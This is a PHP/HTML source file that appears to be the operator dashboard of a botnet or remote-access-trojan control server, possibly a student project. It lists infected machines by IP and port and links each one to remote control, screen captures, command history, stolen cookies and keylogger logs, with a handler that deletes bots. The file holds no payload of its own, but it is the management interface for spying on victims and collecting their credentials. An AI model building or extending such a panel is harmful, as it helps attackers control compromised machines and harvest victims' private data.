<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Get Cookies</title>
	<link rel="stylesheet" type="text/css" href="../css/copy.css">
	<style>
		body {
			font-family: Arial, Helvetica, sans-serif;
			text-align: center;
			/* //background-color: #87ceeb; */
			padding: 20px;
			background-image: url('../img/botactive.png');
			background-size: cover;
		}

		a {
			/* text-decoration: none; */
			color: white;
		}

		caption {
			font-size: 60px;
			font-family: "Brush Script MT", cursive;
			color: red;
			font-weight: 600;
		}	
	</style>
</head>

<body>
	<div id="bottable">		
		<?php
		$db = new mysqli('localhost', 'root', '', 'pbl4_v2');
		if (mysqli_connect_errno()) exit;		
		$query = "SELECT ID, ip, port FROM botes";
		$stmt = $db->prepare($query);
		$stmt->execute();
		$stmt->bind_result($ID, $ip, $port);

		echo '<table class="container">';
		echo '<caption>Table Bot Active</caption>';
		echo '<tr> <th>ID</th> <th>IP</th> <th>Port</th> <th>Control</th> <th>Capture</th> <th>Cmd</th> <th>Cookies</th> <th>Keylogger</th> <th>Delete</th></tr>';
		while ($stmt->fetch()) {
			echo '<tr>';
			$control = "<a href='../php/openBot.php?ID=" . $ID . "&ip=" . $ip . "&port=" . $port . "'>Control</a>";
			$viewCapture = "<a href='../php/viewCapture.php?ID=".$ID."'>View</a>";
			$viewCmd = "<a href='../php/viewCmd.php?ID=" . $ID . "'>View</a>";
			$viewCookie = "<a href='../php/viewCookie.php?ID=" . $ID . "'>View</a>";
			$viewKeylog = "<a href='../php/viewKeylog.php?ID=" . $ID . "'>View</a>";
			$delete = "<a href='../php/index.php?bot=" . $ip . "'>Delete</a>";
			echo '<td>'.$ID.'</td> <td>'.$ip.'</td> <td>'.$port.'</td> <td>'.$control.'</td> <td>'.$viewCapture.'</td> <td>'.$viewCmd.'</td> <td>'.$viewCookie.'</td> <td>'.$viewKeylog.'</td> <td>'.$delete.'</td>';
			echo '</tr>';
		}
		echo '</table>';
		?>
	</div>
</body>

</html>


<?php
if (isset($_GET['bot']) && !empty($_GET['bot'])) {
	$bot =  $_GET['bot'];
	$db = new mysqli('localhost', 'root', '', 'pbl4');
	if (mysqli_connect_errno()) exit;
	$query = "DELETE FROM botes WHERE ip=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('s', $bot);
	$stmt->execute();
	$db->close();
	echo "bot deleted";
	header("Location: ../php/index.php");
}
?>